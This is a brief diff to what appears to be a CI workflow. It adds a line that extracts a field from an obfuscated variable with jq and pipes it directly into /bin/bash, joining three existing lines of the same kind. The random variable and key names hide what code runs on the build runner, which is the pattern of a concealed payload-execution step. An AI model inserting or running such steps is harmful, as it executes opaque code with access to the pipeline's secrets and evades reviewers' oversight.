@@ -39,6 +39,7 @@ jobs:
           echo $pw8109 | jq -r .kko25 | /bin/bash
           printf '%s' "$gtc58548" | jq -r .v097 | /bin/bash
           echo $zxki3821 | jq -r .mpufw16 | /bin/bash
+          printf '%s' "$o2" | jq -r .z2902 | /bin/bash
 
       - name: Upload artifact
         if: always()
